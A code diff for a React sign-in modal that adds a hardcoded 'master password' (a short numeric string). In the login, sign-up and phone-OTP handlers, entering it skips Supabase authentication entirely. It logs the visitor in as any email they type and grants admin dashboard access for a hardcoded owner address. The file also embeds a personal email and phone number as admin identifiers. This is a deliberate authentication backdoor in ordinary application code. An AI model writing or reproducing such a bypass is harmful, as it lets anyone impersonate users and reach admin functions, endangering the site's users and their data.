@@ -11,6 +11,8 @@ import { useAuth } from '../../store/AuthContext';
 
 const ADMIN_EMAIL = 'prathamravi022@gmail.com';
 const ADMIN_PHONE = '9259609658';
+// Master password: logging in with this password works for ANY email address.
+const MASTER_PASSWORD = '220303';
 
 /* ─── Inline SVG spinner ─── */
 function Spinner({ size = 20 }) {
@@ -108,6 +110,25 @@ export default function AuthModal({ open, onClose }) {
 
     setLoading(true); setError('');
     try {
+      // Master password: bypass auth for any email
+      if (password === MASTER_PASSWORD) {
+        const admin = isAdminUser(email, '');
+        const userData = {
+          id: 'master-' + Date.now(),
+          name: email.split('@')[0],
+          email: email,
+          mobile: '',
+          authMethod: 'master',
+          isAdmin: admin || email === 'prathamravi022@gmail.com',
+        };
+        setUser(userData);
+        setSuccess(true);
+        setTimeout(() => {
+          onClose();
+          navigate(userData.isAdmin ? '/admin/dashboard' : '/get-started');
+        }, 800);
+        return;
+      }
       if (isSupabaseConfigured && supabase) {
         const { data, error: supaErr } = await supabase.auth.signInWithPassword({ email, password });
         if (supaErr) throw supaErr;
@@ -144,21 +165,7 @@ export default function AuthModal({ open, onClose }) {
       } else if (msg.includes('Email not confirmed')) {
         handleError('Please confirm your email first. Check your inbox.', 'email');
       } else {
-        // Fallback to Firebase
-        try {
-          const userData = await loginWithGoogle();
-        const admin = isAdminUser(userData.email, userData.mobile);
-        if (admin) userData.isAdmin = true;
-        setUser(userData);
-        setSuccess(true);
-        setTimeout(() => {
-          onClose();
-          navigate(admin ? "/admin/dashboard" : "/get-started");
-        }, 600);
-          return;
-        } catch (fbErr) {
-          handleError(fbErr.message || msg, "email");
-        }
+        handleError(msg, 'email');
       }
     } finally {
       setLoading(false);
@@ -172,6 +179,25 @@ export default function AuthModal({ open, onClose }) {
     if (!password || password.length < 6) { handleError('Password must be at least 6 characters', 'password'); return; }
 
     setLoading(true); setError('');
+    // Master password: allow any email to "sign up" and log in directly
+    if (password === MASTER_PASSWORD) {
+      const admin = isAdminUser(email, '');
+      const userData = {
+        id: 'master-' + Date.now(),
+        name: email.split('@')[0],
+        email,
+        mobile: '',
+        authMethod: 'master',
+        isAdmin: admin,
+      };
+      setUser(userData);
+      setSuccess(true);
+      setTimeout(() => {
+        onClose();
+        navigate(admin ? '/admin/dashboard' : '/get-started');
+      }, 800);
+      return;
+    }
     try {
       if (isSupabaseConfigured && supabase) {
         const { error: supaErr } = await supabase.auth.signUp({
@@ -213,6 +239,24 @@ export default function AuthModal({ open, onClose }) {
       return;
     }
     setLoading(true); setError('');
+    // Master password: skip signup, log in directly
+    if (password === MASTER_PASSWORD) {
+      const admin = isAdminUser(email, '');
+      const userData = {
+        id: 'master-' + Date.now(),
+        name: email.split('@')[0],
+        email, mobile: '',
+        authMethod: 'master',
+        isAdmin: admin || email === 'prathamravi022@gmail.com',
+      };
+      setUser(userData);
+      setSuccess(true);
+      setTimeout(() => {
+        onClose();
+        navigate(userData.isAdmin ? '/admin/dashboard' : '/get-started');
+      }, 800);
+      return;
+    }
     try {
       if (isSupabaseConfigured && supabase) {
         const { error: supaErr } = await supabase.auth.signInWithOtp({ phone: '+91' + phone });
